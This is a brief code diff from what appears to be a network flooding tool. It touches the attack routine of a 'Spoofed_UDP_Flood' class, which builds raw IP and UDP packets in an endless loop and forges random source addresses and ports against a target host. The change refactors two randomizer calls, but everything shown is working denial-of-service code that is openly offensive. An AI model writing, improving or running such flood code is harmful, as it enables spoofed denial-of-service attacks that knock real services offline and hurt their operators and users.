@@ -21,7 +21,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
     auto *udp = (struct udphdr *) (buf + sizeof (struct ip));
     struct hostent *hp;
     struct sockaddr_in dst{};
-    auto s_port = Randomizer::randomInt(0, 65535);
+    auto s_port = Randomizer::randomPort();
     while (true){
         for(int x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
@@ -37,7 +37,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
+            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                 continue;
             }
 
